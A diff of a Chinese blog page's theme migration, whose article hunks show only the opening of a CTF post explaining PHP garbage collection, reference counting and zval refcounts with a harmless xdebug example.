@@ -1,22 +1,24 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=dark>
-
-
-
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
-  <link rel="icon" href="/img/fav.ico">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Sl0th">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="PHP垃圾回收器与反序列化利用垃圾回收机制指php会自动释放程序不再需要的已分配的内存块。 PHP5.3之前采用引用计数的方式，给每个内存对象分配一个计数器，每当内存对象被引用时，计数器+1，引用撤销后(unset())，计数器-1，对技术器&#x3D;0时，对内存对象进行销毁，垃圾回收机制完成，php一个生命周期后会释放此进程&#x2F;线程所占的内容 存在问题：两个或多个对象相互引用，使得计数">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Sl0th">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://sloth31.github.io/2022/10/20/php垃圾回收器与反序列化利用/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="PHP垃圾回收器与反序列化利用垃圾回收机制指php会自动释放程序不再需要的已分配的内存块。 PHP5.3之前采用引用计数的方式，给每个内存对象分配一个计数器，每当内存对象被引用时，计数器+1，引用撤销后(unset())，计数器-1，对技术器&#x3D;0时，对内存对象进行销毁，垃圾回收机制完成，php一个生命周期后会释放此进程&#x2F;线程所占的内容 存在问题：两个或多个对象相互引用，使得计数">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP垃圾回收器与反序列化利用">
 <meta property="og:url" content="http://sloth31.github.io/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/index.html">
@@ -30,291 +32,512 @@
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="gc">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072213238.png">
-  
-  
-  
-  <title>PHP垃圾回收器与反序列化利用 | Sl0th&#39;s Blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="/css/macpanel.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
-  
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/img/fav.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/img/fav.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/img/fav.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            PHP垃圾回收器与反序列化利用 | Sl0th&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
+    <!--- Inject Part-->
+    
 
-  
-<meta name="generator" content="Hexo 6.1.0"></head>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"sloth31.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/img/night.jpg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/img/day.jpg","dark":"/img/night.jpg"},"title":"👋Welcome to Sl0th's Blog🎉","subtitle":{"text":["There is no royal road to learning"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4D5356","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":"enable","style":"default","links":{"github":"https://github.com/sloth31","instagram":null,"zhihu":null,"twitter":null,"email":"z694081360@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/sloth31","Blog":"http://sl0th.top/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
-  
-
-  <header>
+<div class="progress-bar-container">
     
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Sl0th&#39;s blog</strong>
-    </a>
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/img/fav.ico" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Sl0th&#39;s Blog
+                
             </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="PHP垃圾回收器与反序列化利用"></span>
-          
         </div>
 
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-20 23:29" pubdate>
-          2022年10月20日 晚上
-        </time>
-      </span>
-    
-  </div>
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
 
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          6.1k 字
-        
-      </span>
-    
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
 
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          34 分钟
-        
-      </span>
-    
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
-    
-  </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
 
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-        
-      </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
 
-      
-    </div>
-  </div>
-</div>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-</div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
 
-  </header>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-  <main>
-    
-      
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">PHP垃圾回收器与反序列化利用</h1>
-            
-            
-              <div class="markdown-body">
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/sloth31">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="http://sl0th.top/">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
                 
-                <h1 id="PHP垃圾回收器与反序列化利用"><a href="#PHP垃圾回收器与反序列化利用" class="headerlink" title="PHP垃圾回收器与反序列化利用"></a>PHP垃圾回收器与反序列化利用</h1><h2 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h2><p>指php会自动释放程序不再需要的已分配的内存块。</p>
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/sloth31">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="http://sl0th.top/">BLOG</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">27</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">44</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">PHP垃圾回收器与反序列化利用</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/img/avatar.JPG">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Sl0th</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2022-10-20 23:29:13</span>
+        <span class="mobile">2022-10-20 23:29:13</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-12-07 22:40:42</span>
+            <span class="mobile">2023-12-07 22:40:42</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/ctf/">ctf</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/php/">php</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/gc/">gc</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="PHP垃圾回收器与反序列化利用"><a href="#PHP垃圾回收器与反序列化利用" class="headerlink" title="PHP垃圾回收器与反序列化利用"></a>PHP垃圾回收器与反序列化利用</h1><h2 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h2><p>指php会自动释放程序不再需要的已分配的内存块。</p>
 <h3 id="PHP5-3之前"><a href="#PHP5-3之前" class="headerlink" title="PHP5.3之前"></a>PHP5.3之前</h3><p>采用引用计数的方式，给每个内存对象分配一个计数器，每当内存对象被引用时，计数器+1，引用撤销后(unset())，计数器-1，对技术器&#x3D;0时，对内存对象进行销毁，垃圾回收机制完成，php一个生命周期后会释放此进程&#x2F;线程所占的内容</p>
 <p>存在问题：两个或多个对象相互引用，使得计数器永远不为0，导致内存对象无法被回收</p>
 <h3 id="PHP5-3"><a href="#PHP5-3" class="headerlink" title="PHP5.3"></a>PHP5.3</h3><p>加入复杂算法检测引用环的存在，避免内存泄露。</p>
 <p>每个php变量存在一个叫zval的变量容器中，存储了变量的类型和值，还存储了“is_ref”bool型变量以标识该变量是否属于引用集合；还有一个“refcount”，用于表示指向这个zval变量容器的变量个数，注意，多个变量是可以共用一个变量容器的。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span> );<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;new string&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="keyword">unset</span>( <span class="variable">$b</span>, <span class="variable">$c</span> );</span><br><span class="line"><span class="title function_ invoke__">xdebug_debug_zval</span>( <span class="string">&#x27;a&#x27;</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>以上代码会输出</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">a: (<span class="hljs-attribute">refcount</span>=3, <span class="hljs-attribute">is_ref</span>=0)=&#x27;new string<span class="hljs-string">&#x27; </span><br><span class="hljs-string">a: (refcount=1, is_ref=0)=&#x27;</span>new string<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a: (refcount=3, is_ref=0)=&#x27;new string&#x27; </span><br><span class="line">a: (refcount=1, is_ref=0)=&#x27;new string&#x27;</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="PHP7的NTS版本"><a href="#PHP7的NTS版本" class="headerlink" title="PHP7的NTS版本"></a>PHP7的NTS版本</h3><p>在该版本，上述通过赋值同一个变量的情况已经不会再被计数，PHP7中，zval可以被引用计数或不被引用</p>
 <ul>
@@ -323,10 +546,10 @@
 <li>对于字符串，未被引用的变量被称为“实际字符串”。而那些被引用的字符串也不计数</li>
 <li>对于数组，未引用的变量被称为“不可变数组”。其数组本身计数与php5一致，但是数组里面的每个键值对的计数，则按前面三条的规则（即如果是字符串也不在计数）；如果使用opcache，则代码中的常量数组文字将被转换为不可变数组。</li>
 </ul>
